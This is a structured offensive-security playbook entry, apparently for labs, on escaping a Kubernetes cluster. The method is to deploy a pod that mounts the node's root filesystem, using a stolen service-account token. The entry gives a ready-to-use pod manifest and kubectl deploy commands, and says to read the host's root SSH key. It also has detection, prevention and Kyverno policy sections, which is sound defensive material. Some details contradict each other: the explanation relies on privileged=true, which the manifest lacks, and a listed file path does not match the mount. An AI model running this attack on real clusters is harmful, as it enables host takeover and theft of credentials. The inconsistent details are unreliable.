examples.label: Pod spec mounts host / via hostPath at /root
Read the node's root SSH key through the pod

notes: If the stolen token can create pods, deploy one with a hostPath volume mounting the node's / - that reads root's files (e.g. SSH key) straight off the host, escaping the cluster.

recommended.note: Provides the token used to create this pod.

name: Kubernetes - Deploy Privileged Pod (Host Mount)
description: If the token can create pods, deploy one that mounts the host root filesystem (hostPath /), then exec into it to read the node's root SSH key or write to the host.

steps.label: 1. privesc.yaml (mount host / into pod)
steps.command:
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

steps.label: 2. Deploy and verify
steps.command:
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

defense.why_it_works: A Kubernetes pod with security.privileged=true runs with host-level privileges. With a hostPath volume mounting /, the container has read/write access to the entire host filesystem. An attacker with pod creation rights can deploy such a pod and read /root/.ssh/id_rsa, /etc/shadow, or write to /etc/cron.d to escape to the host.
defense.prerequisites: Kubernetes RBAC permissions to create pods (pods/create). No pod security policies (PodSecurityPolicy deprecated, replaced by OPA/Kyverno). Access to kubectl with a valid service account token.
defense.impact: Full host filesystem access from within a container. Read SSH keys, shadow files, kubeconfig. Write cron jobs, SSH authorized_keys for persistent root access on the underlying node.
defense.detection: Kubernetes audit log: pod creation with privileged=true and hostPath / mount. SIEM: alert on privileged pod creation. OPA/Kyverno policy violation if enforcement is active.
defense.artifacts: Kubernetes audit log (kubectl apply privesc.yaml) | Container runtime log (privileged container started) | File access log (reads to /mnt/root/root/)
defense.prevention: Enforce Pod Security Standards (Restricted or Baseline) via admission controllers. Use OPA/Kyverno policies to deny pods with privileged=true or hostPath mounts. Use PodSecurityContext with runAsNonRoot=true, readOnlyRootFilesystem=true. Restrict pod creation RBAC to trusted namespaces only.
defense.misconfiguration: Kubernetes cluster allows privileged pod creation with host filesystem mounts. No admission controller enforcing Pod Security Standards. Service account tokens have pods/create permission at cluster level.
defense.vulnerable_config:
# Insecure pod spec
apiVersion: v1
kind: Pod
spec:
  containers:
  - securityContext:
      privileged: true  # full host access
  volumes:
  - hostPath:
      path: /   # entire host filesystem

# No PodSecurityPolicy / OPA admission controller
defense.secure_config:
# Enforce Pod Security Standards
# namespace label
kubectl label namespace default \
  pod-security.kubernetes.io/enforce=restricted

# OPA/Kyverno policy
apiVersion: kyverno.io/v1
kind: ClusterPolicy
spec:
  rules:
  - name: restrict-privileged
    match:
      resources: {kinds: [Pod]}
    validate:
      deny:
        conditions:
          - key: "{{request.object.spec.containers[].securityContext.privileged}}"
            operator: Equals
            value: true
